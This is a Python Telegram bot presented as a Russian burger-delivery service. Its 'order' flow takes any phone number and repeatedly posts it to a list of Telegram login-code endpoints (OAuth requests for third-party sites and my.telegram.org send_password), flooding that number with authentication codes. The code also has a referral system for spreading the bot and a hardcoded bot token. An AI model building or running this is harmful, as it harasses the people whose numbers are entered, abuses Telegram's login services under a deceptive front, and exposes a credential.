import os

from telebot import apihelper

os.environ['no_proxy'] = '*'
apihelper.proxy = {'https': 'http://127.0.0.1:10809'}
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time
import requests
from threading import Thread, Lock
import json
from datetime import datetime

TOKEN = '8660305665:AAFarX_ogkXfNr4xnCifJpo2Bjj1KKVpFsc'
bot = telebot.TeleBot(TOKEN)

MAX_CYCLES = 10
REQUEST_DELAY = 0.3

HEADERS = {
    'User-Agent': 'Mozilla/5.0'
}

stop_flags = {}
temp_data = {}

# ---- referral / storage ----
DATA_FILE = 'users.json'
data_lock = Lock()
_users_cache = None  # in-memory cache

def load_data():
    global _users_cache
    with data_lock:
        if _users_cache is not None:
            return _users_cache
        if not os.path.exists(DATA_FILE):
            _users_cache = {}
            return _users_cache
        try:
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                _users_cache = json.load(f)
        except Exception:
            _users_cache = {}
        return _users_cache

def save_data():
    global _users_cache
    with data_lock:
        if _users_cache is None:
            _users_cache = {}
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(_users_cache, f, ensure_ascii=False, indent=2)

def ensure_user_record(user_id, from_user=None, referred_by=None):
    user_id_str = str(user_id)
    data = load_data()
    is_new = False
    if user_id_str not in data:
        is_new = True
        data[user_id_str] = {
            "id": user_id,
            "first_name": from_user.first_name if from_user else None,
            "username": from_user.username if from_user else None,
            "joined_at": datetime.utcnow().isoformat(),
            "referred_by": None,
            "referrals_count": 0,
            "referred_list": []
        }

        if referred_by:
            ref_str = str(referred_by)
            if ref_str != user_id_str and ref_str in data:
                data[user_id_str]["referred_by"] = referred_by
                if user_id not in data[ref_str]["referred_list"]:
                    data[ref_str]["referred_list"].append(user_id)
                    data[ref_str]["referrals_count"] = len(data[ref_str]["referred_list"])
        save_data()
    return is_new, data[user_id_str]

@bot.message_handler(commands=['start'])
def start(message):
    payload = None
    parts = message.text.split()
    if len(parts) > 1:
        payload = parts[1].strip()

    referred_by = None
    if payload and payload.isdigit():
        referred_by = int(payload)

    ensure_user_record(message.from_user.id, from_user=message.from_user, referred_by=referred_by)
    show_main_menu(message.chat.id)

@bot.message_handler(commands=['profile'])
def profile_command(message):
    show_profile(message.chat.id, message.from_user.id, message.message_id if message else None)

def show_main_menu(chat_id):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🍔 Заказать бургеры", callback_data='start_test'))
    markup.row(InlineKeyboardButton("👤 Профиль", callback_data='profile'))
    markup.row(InlineKeyboardButton("ℹ️ Информация", callback_data='info'))
    bot.send_message(
        chat_id,
        "👋 *Добро пожаловать в мир бургеров!*\n\n"
        "🚀 Самая быстрая доставка по всей России!\n"
        "🍔 Лучшие бургеры, от которых вы точно не сможете отказаться!\n\n"
        "Готовы сделать заказ? 👇",
        parse_mode='Markdown',
        reply_markup=markup
    )

def send_request(url, phone):
    try:
        response = requests.post(url, headers=HEADERS, data={'phone': phone}, timeout=5)
        return response.status_code == 200
    except:
        return False

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'start_test':
        msg = bot.send_message(
            call.message.chat.id,
            "📞 Введите *номер телефона* для заказа:\n\nПример: `79123456789`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_phone)

    elif call.data == 'info':
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu'))
        try:
            bot.edit_message_text(
                "ℹ️ *Информация о боте*\n\n"
                "Этот бот предназначен для заказа бургеров с доставкой.\n\n"
                "Сейчас бот находится в *тестовом режиме*.\n"
                "Приятного пользования! 🍔",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=markup,
                parse_mode='Markdown'
            )
        except Exception:
            bot.send_message(
                call.message.chat.id,
                "ℹ️ *Информация о боте*\n\n"
                "Этот бот предназначен для заказа бургеров с доставкой.\n\n"
                "Сейчас бот находится в *тестовом режиме*.\n"
                "Приятного пользования! 🍔",
                parse_mode='Markdown',
                reply_markup=markup
            )

    elif call.data == 'back_to_menu':
        show_main_menu(call.message.chat.id)

    elif call.data == 'confirm_phone':
        phone = temp_data.get(call.message.chat.id)
        if phone:
            ask_cycles(call.message, phone)

    elif call.data == 'edit_phone':
        msg = bot.send_message(
            call.message.chat.id,
            "✏️ Введите *новый номер телефона* (например: `79123456789`):",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_phone)

    elif call.data == 'cancel_delivery':
        stop_flags[call.message.chat.id] = True
        bot.edit_message_text(
            "⛔ *Доставка отменена пользователем.*\n\n"
            "Если передумаете — всегда можно заказать снова! 🍔",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown'
        )

    elif call.data == 'profile':
        show_profile(call.message.chat.id, call.from_user.id, call.message.message_id)

def process_phone(message):
    phone = message.text.strip()
    if not phone.isdigit() or len(phone) != 11:
        msg = bot.send_message(
            message.chat.id,
            "❌ Номер некорректный. Пожалуйста, введите 11 цифр (например: 79123456789):"
        )
        bot.register_next_step_handler(msg, process_phone)
        return

    temp_data[message.chat.id] = phone
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Всё верно", callback_data='confirm_phone'))
    markup.add(InlineKeyboardButton("✏️ Изменить", callback_data='edit_phone'))

    bot.send_message(
        message.chat.id,
        f"📱 Вы ввели номер: `{phone}`\n\nВсё правильно?",
        parse_mode='Markdown',
        reply_markup=markup
    )

def ask_cycles(message, phone):
    msg = bot.send_message(
        message.chat.id,
        f"🔢 Сколько циклов запустить? (от 1 до {MAX_CYCLES}):"
    )
    bot.register_next_step_handler(msg, lambda m: start_test(m, phone))

def start_test(message, phone):
    try:
        cycles = int(message.text)
        if cycles < 1 or cycles > MAX_CYCLES:
            raise ValueError(f"Введите число от 1 до {MAX_CYCLES}")

        stop_flags[message.chat.id] = False

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ Отменить", callback_data='cancel_delivery'))

        bot.send_message(
            message.chat.id,
            f"🔄 Начинаем процесс!\n"
            f"📞 Номер: `{phone}`\n"
            f"🔁 Циклов: {cycles}\n\n"
            f"Нажмите кнопку ниже, чтобы отменить в любой момент.",
            parse_mode='Markdown',
            reply_markup=markup
        )

        Thread(target=run_test, args=(message.chat.id, phone, cycles)).start()

    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ {e}")

def run_test(chat_id, phone, cycles):
    try:
        test_urls = [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'https://my.telegram.org/auth/send_password'
        ]

        status_msg = bot.send_message(
            chat_id,
            f"🚚 *Запуск процесса...*\n\n"
            f"📞 Номер: `{phone}`\n"
            f"🔁 Циклы: {cycles}\n"
            f"📦 Отправлено: 0\n"
            f"⏳ Статус: _в процессе..._",
            parse_mode='Markdown'
        )

        total = 0
        cycle = 0
        for cycle in range(cycles):
            if stop_flags.get(chat_id):
                break

            for url in test_urls:
                if stop_flags.get(chat_id):
                    break

                if send_request(url, phone):
                    total += 1
                    try:
                        bot.edit_message_text(
                            f"🚚 *Процесс в ходу...*\n\n"
                            f"📞 Номер: `{phone}`\n"
                            f"🔁 Цикл: {cycle + 1}/{cycles}\n"
                            f"📦 Отправлено: {total}\n"
                            f"⏳ Статус: _в процессе..._",
                            chat_id,
                            status_msg.message_id,
                            parse_mode='Markdown'
                        )
                    except Exception:
                        pass
                    time.sleep(REQUEST_DELAY)

        if stop_flags.get(chat_id):
            bot.edit_message_text(
                f"⛔ *Процесс отменен!*\n\n"
                f"📞 Номер: `{phone}`\n"
                f"🔁 Завершено циклов: {cycle + 1}\n"
                f"📦 Отправлено: {total}",
                chat_id,
                status_msg.message_id,
                parse_mode='Markdown'
            )
        else:
            bot.edit_message_text(
                f"✅ *Готово!*\n\n"
                f"📞 Номер: `{phone}`\n"
                f"🔁 Всего циклов: {cycle + 1}\n"
                f"📦 Всего отправлено: {total}",
                chat_id,
                status_msg.message_id,
                parse_mode='Markdown'
            )

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Ошибка: {e}")
    finally:
        if chat_id in stop_flags:
            del stop_flags[chat_id]

def show_profile(chat_id, user_id, reply_message_id=None):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str not in data:
        ensure_user_record(user_id, from_user=None, referred_by=None)
        data = load_data()

    rec = data[user_id_str]
    referrals_count = rec.get("referrals_count", 0)
    referred_list = rec.get("referred_list", [])

    try:
        bot_username = bot.get_me().username
    except Exception:
        bot_username = None

    text = (
        f"👤 *Профиль*\n\n"
        f"💠 ID: `{rec['id']}`\n"
        f"🔹 Имя: {rec.get('first_name') or '—'}\n"
        f"🔹 Логин: @{rec.get('username') or '—'}\n"
        f"📥 Пригласил(и): *{referrals_count}*\n"
        f"📅 Зарегистрирован(а): `{rec.get('joined_at')}`\n"
    )

    markup = InlineKeyboardMarkup()
    if bot_username:
        ref_link = f"https://t.me/{bot_username}?start={rec['id']}"
        markup.add(InlineKeyboardButton("🔗 Поделиться реферальной ссылкой", url=ref_link))
    markup.add(InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu'))

    if referred_list:
        short = ', '.join(str(x) for x in referred_list[:10])
        text += f"\n🧾 Первые приглашённые: {short}"
        if len(referred_list) > 10:
            text += f" и ещё {len(referred_list) - 10}..."

    try:
        if reply_message_id:
            bot.edit_message_text(text, chat_id, reply_message_id, reply_markup=markup, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')
    except Exception:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')

if __name__ == '__main__':
    print("Бот запущен!")
    load_data()
    bot.polling(none_stop=True)
